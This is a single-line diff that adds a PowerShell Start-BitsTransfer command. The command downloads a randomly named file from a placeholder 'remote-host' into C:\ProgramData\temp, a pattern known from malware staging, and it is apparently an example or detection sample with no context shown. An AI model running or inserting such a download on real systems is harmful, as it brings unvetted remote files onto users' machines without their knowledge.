@@ -1,0 +1,1 @@
+Start-BitsTransfer -Source "http://remote-host/TWUEGJDITXAONVPUOWFV" -Destination "C:\ProgramData\temp\TWUEGJDITXAONVPUOWFV"
